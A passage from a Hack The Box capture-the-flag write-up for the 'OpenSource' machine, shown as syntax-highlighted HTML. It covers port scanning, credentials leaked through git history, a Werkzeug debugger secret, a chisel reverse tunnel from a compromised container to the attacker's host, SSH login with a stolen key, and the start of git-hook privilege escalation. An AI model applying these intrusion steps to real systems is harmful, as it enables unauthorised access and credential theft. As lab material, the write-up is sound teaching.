font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>meta <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">http-equiv=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Content-Type"</span> content=<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"text/html;charset=utf-8"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-50"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>title<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>Error <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">response</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/title<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-51"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/head<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-52"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>body<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-53"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>h1<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>Error <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">response</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/h1<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-54"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>p<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>Error <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">code:</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">400</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/p<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-55"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>p<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>Message: <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Bad</span> request version <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'RTSP/1.0'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">.</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/p<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-56"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>p<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>Error <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">code</span> explanation: HTTPStatus.BAD_REQUEST <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> Bad request syntax or unsupported method.<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/p<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-57"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>     <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/body<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-58"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>    <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/html<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb1-59"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-title:</span> upcloud <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> Upload files for Free!</span>
<span id="cb1-60"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_http-server-header:</span> Werkzeug/2.1.2 Python/3.10.3</span>
<span id="cb1-61"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3000/tcp</span> filtered ppp</span>
<span id="cb1-62"></span>
<span id="cb1-63"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  opensource sudo nmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-sU</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--top-port</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>50 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--open</span> 10.129.69.218</span>
<span id="cb1-64"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">PORT</span>   STATE         SERVICE</span>
<span id="cb1-65"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">68/udp</span> open<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">filtered</span> dhcpc</span></code></pre></div>
<p><strong>webanalyze:</strong></p>
<div class="sourceCode" id="cb2" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb2-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  webanalyze ./webanalyze <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-host</span> http://10.129.69.218</span>
<span id="cb2-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">http://10.129.69.218</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0.1s</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb2-3">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Python,</span> 3.10.3 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Programming</span> languages<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb2-4">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Bootstrap,</span>  <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UI</span> frameworks<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb2-5">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Flask,</span> 2.1.2 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Web</span> frameworks, Web servers<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb2-6">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Python,</span>  <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Programming</span> languages<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span></code></pre></div>
<p>Visit the webpage and we find a site where we can upload files without authentication. The code is OpenSource and we are able to download it all.</p>
<p>Download the code and extract it. First thing we see is a <code>.git</code> directory, lets look for secrets there!</p>
<div class="sourceCode" id="cb3" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb3-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  logs git:<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">public</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cat</span> HEAD </span>
<span id="cb3-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0000000000000000000000000000000000000000</span> ee9d9f1ef9156c787d53074493e39ae364cd1e05 gituser <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>gituser@local<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> 1651146317 +0200  commit <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">initial</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span> initial</span>
<span id="cb3-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ee9d9f1ef9156c787d53074493e39ae364cd1e05</span> 0000000000000000000000000000000000000000 gituser <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>gituser@local<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> 1651146317 +0200  Branch: renamed refs/heads/master to refs/heads/public</span>
<span id="cb3-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0000000000000000000000000000000000000000</span> ee9d9f1ef9156c787d53074493e39ae364cd1e05 gituser <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>gituser@local<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> 1651146317 +0200  Branch: renamed refs/heads/master to refs/heads/public</span>
<span id="cb3-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ee9d9f1ef9156c787d53074493e39ae364cd1e05</span> ee9d9f1ef9156c787d53074493e39ae364cd1e05 gituser <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>gituser@local<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> 1651146352 +0200  checkout: moving from public to dev</span>
<span id="cb3-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ee9d9f1ef9156c787d53074493e39ae364cd1e05</span> a76f8f75f7a4a12b706b0cf9c983796fa1985820 gituser <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>gituser@local<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> 1651146376 +0200  commit: updated</span>
<span id="cb3-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">a76f8f75f7a4a12b706b0cf9c983796fa1985820</span> be4da71987bbbc8fae7c961fb2de01ebd0be1997 gituser <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>gituser@local<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> 1651146414 +0200  commit: added gitignore</span>
<span id="cb3-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">be4da71987bbbc8fae7c961fb2de01ebd0be1997</span> c41fedef2ec6df98735c11b2faf1e79ef492a0f3 gituser <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>gituser@local<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> 1651146444 +0200  commit: ease testing</span>
<span id="cb3-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">c41fedef2ec6df98735c11b2faf1e79ef492a0f3</span> ee9d9f1ef9156c787d53074493e39ae364cd1e05 gituser <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>gituser@local<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> 1651146451 +0200  checkout: moving from dev to public</span>
<span id="cb3-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ee9d9f1ef9156c787d53074493e39ae364cd1e05</span> 2c67a52253c6fe1f206ad82ba747e43208e8cfd9 gituser <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>gituser@local<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> 1651146955 +0200  commit: clean up dockerfile for production use</span>
<span id="cb3-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2c67a52253c6fe1f206ad82ba747e43208e8cfd9</span> c41fedef2ec6df98735c11b2faf1e79ef492a0f3 gituser <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>gituser@local<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> 1651147059 +0200  checkout: moving from public to dev</span>
<span id="cb3-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">c41fedef2ec6df98735c11b2faf1e79ef492a0f3</span> 2c67a52253c6fe1f206ad82ba747e43208e8cfd9 gituser <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>gituser@local<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> 1651150220 +0200  checkout: moving from dev to public</span></code></pre></div>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  logs git:<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">public</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">git</span> diff ee9d9f1ef9156c787d53074493e39ae364cd1e05 a76f8f75f7a4a12b706b0cf9c983796fa1985820</span>
<span id="cb4-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb4-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+++</span> b/app/.vscode/settings.json</span>
<span id="cb4-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">@@</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-0,0</span> +1,5 @@</span>
<span id="cb4-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+{</span></span>
<span id="cb4-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span>  <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"python.pythonPath"</span>: <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python"</span>,</span>
<span id="cb4-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span>  <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"http.proxy"</span>: <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"http://dev01:Soulless_Developer#2022@10.10.10.128:5187/"</span>,</span>
<span id="cb4-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+</span>  <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"http.proxyStrictSSL"</span>: false</span>
<span id="cb4-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+}</span></span></code></pre></div>
<p>We find a set of creds, <code>dev01:Soulless_Developer#2022</code>, although it’s towards an IP and port that we don’t recognize. Lets look if it’s the same for SSH.</p>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  opensource ssh dev01@10.129.69.218</span>
<span id="cb5-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb5-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dev01@10.129.69.218:</span> Permission denied <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">publickey</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">.</span></span></code></pre></div>
<p>Trying to download a file that doesn’t exist they leak the PATH and a secret key in the error response, however <code>/console</code> is locked with a PIN so we can’t get RCE there..</p>
<div class="sourceCode" id="cb6" style="background: #f1f3f5;"><pre class="sourceCode html code-with-copy"><code class="sourceCode html"><span id="cb6-1">## REQUEST</span>
<span id="cb6-2">GET /uploads/asdf.py HTTP/1.1</span>
<span id="cb6-3">Host: 10.129.69.218</span>
<span id="cb6-4"></span>
<span id="cb6-5">## RESPONSE</span>
<span id="cb6-6">[... snip ...]</span>
<span id="cb6-7">  <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">head</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb6-8">    <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">title</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span>FileNotFoundError: [Errno 2] No such file or directory: '/app/public/uploads/asdauthorized_keys'</span>
<span id="cb6-9"> // Werkzeug Debugger<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">title</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb6-10">    <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">link</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;"> rel</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"stylesheet"</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;"> href</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"?__debugger__=yes</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">&amp;amp;</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">cmd=resource</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">&amp;amp;</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">f=style.css"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb6-11">    <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">link</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;"> rel</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"shortcut icon"</span></span>
<span id="cb6-12"><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">        href</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"?__debugger__=yes</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">&amp;amp;</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">cmd=resource</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">&amp;amp;</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">f=console.png"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb6-13">    <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">script</span><span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;"> src</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"?__debugger__=yes</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">&amp;amp;</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">cmd=resource</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">&amp;amp;</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">f=debugger.js"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">script</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb6-14">    <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">script</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb6-15">      <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">var</span> CONSOLE_MODE <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">false</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span></span>
<span id="cb6-16">          EVALEX <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">true</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span></span>
<span id="cb6-17">          EVALEX_TRUSTED <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">false</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span></span>
<span id="cb6-18">          SECRET <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"E7MAYp3KlTA309Ic1hST"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">;</span></span>
<span id="cb6-19">    <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">script</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb6-20">  <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&lt;/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">head</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">&gt;</span></span></code></pre></div>
<table class="caption-top table">
<colgroup>
<col style="width: 100%">
</colgroup>
<thead>
<tr class="header">
<th style="text-align: left;">### Step 2 Instead, we can focus on the source code, especially the upload function in <code>views.py</code></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: left;">### Step 3 We’re in a docker container.. both <code>capsh</code> and <code>getcap</code> is unavailable, we don’t have permissions to mount to the host file system. We are unable to SSH to the host with found creds.. but when using <code>wget</code> to enumerate <code>http://172.17.0.1</code> we find a webfront where user <code>dev01</code> is a member - <code>http://opensource.htb:3000/dev01</code>.</td>
</tr>
<tr class="even">
<td style="text-align: left;"><code>bash ➜  chisel_1.7.7 ./chisel_1.7.7_linux_amd64 server -p 3333 -reverse 2022/05/24 10:26:12 server: Reverse tunnelling enabled 2022/05/24 10:26:12 server: Fingerprint 0w1VYvw5UN5G517RVqpm0jScfuRrA5gZN3N7h5iXI10= 2022/05/24 10:26:12 server: Listening on http://0.0.0.0:3333</code></td>
</tr>
<tr class="odd">
<td style="text-align: left;"><code>bash /app/public/uploads # ./chisel_1.7.7_linux_amd64 client 10.10.15.17:3333 R:127.0.0.1:3000:172.17.0.1:3000 2022/05/24 08:26:43 client: Connecting to ws://10.10.15.17:3333 2022/05/24 08:26:43 client: Connected (Latency 43.290943ms)</code></td>
</tr>
<tr class="even">
<td style="text-align: left;"><img src="https://exploit.se/posts/2022-05-24-htb-writeup-opensource/images/opensource01.png" class="img-fluid"></td>
</tr>
<tr class="odd">
<td style="text-align: left;">Login with previously found credentials, <code>dev01:Soulless_Developer#2022</code>, and grab the private key.</td>
</tr>
<tr class="even">
<td style="text-align: left;"><img src="https://exploit.se/posts/2022-05-24-htb-writeup-opensource/images/opensource02.png" class="img-fluid"></td>
</tr>
<tr class="odd">
<td style="text-align: left;">```bash ➜ opensource chmod 400 id_rsa ➜ opensource ssh dev01@10.129.70.252 -i id_rsa dev01@opensource:~$ id &amp;&amp; hostname uid=1000(dev01) gid=1000(dev01) groups=1000(dev01) opensource</td>
</tr>
<tr class="even">
<td style="text-align: left;">dev01@opensource:~$ pwd /home/dev01</td>
</tr>
<tr class="odd">
<td style="text-align: left;">dev01@opensource:~$ cat user.txt 48e3b2ed54ab95e7339d32f60f3f8f46 ```</td>
</tr>
</tbody>
</table>
</section>
</section>
<section id="root" class="level1">
<h1>ROOT</h1>
<section id="step-1-1" class="level3">
<h3 class="anchored" data-anchor-id="step-1-1">Step 1</h3>
<p>We are unable to run <code>sudo -l</code>, and the groups look fine. Reading about GiTea vulnerabilities a lot of articles point towards an authenticated RCE through Git Hooks.</p>
<p>Looking in our web-gui we don’t seem to have that option available. <img src="https://exploit.se/posts/2022-05-24-htb-writeup-opensource/images/opensource03.png" class="img-fluid"></p>
<p>Here’s an vulnerable example: <img src="https://exploit.se/posts/2022-05-24-htb-writeup-opensource/images/opensource04.png" class="img-fluid"></p>
<p>But, we don’t need the web-gui, we have the <code>.git</code> in our home directory as user <code>dev01</code>.</p>
<div class="sourceCode" id="cb7" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">dev01@opensource:~/.git$</span> ls <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span></span>
<span id="cb7-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 60</span>
<span id="cb7-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxrwxr-x</span>  8 dev01 dev01 4096 May 24 11:18 .</span>
<span id="cb7-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span>  8 dev01 dev01 4096 May 24 11:12 ..</span>
<span id="cb7-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxrwxr-x</span>  2 dev01 dev01 4096 May  4 16:35 branches</span>
<span id="cb7-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span>  1 dev01 dev01   22 May 24 11:12 COMMIT_EDITMSG</span>
<span id="cb7-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-rw-r--</span>  1 dev01 dev01  269 May 24 11:18 config</span>
<span id="cb7-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-rw-r--</span>  1 dev01 dev01   73 Mar 23 01:18 description</span>
<span id="cb7-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-rw-r--</span>  1 dev01 dev01  117 Mar 23 01:19 FETCH_HEAD</span>
<span id="cb7-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span>  1 dev01 dev01   21 May 16 12:50 HEAD</span>
<span id="cb7-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxrwxr-x</span>  2 dev01 dev01 4096 May 24 11:12 hooks</span>
<span id="cb7-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span>  1 root  root  1066 May 24 11:13 index</span>
<span id="cb7-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxrwxr-x</span>  2 dev01 dev01 4096 May 24 10:34 info</span>
<span id="cb7-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span>  3 dev01 dev01 4096 May 24 10:34 logs</span>
<span id="cb7-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxrwxr-x</span> 10 dev01 dev01 4096 May 24 11:13 objects</span>
<span id="cb7-16"><span class="ex" style="color: null;
background-color: null;
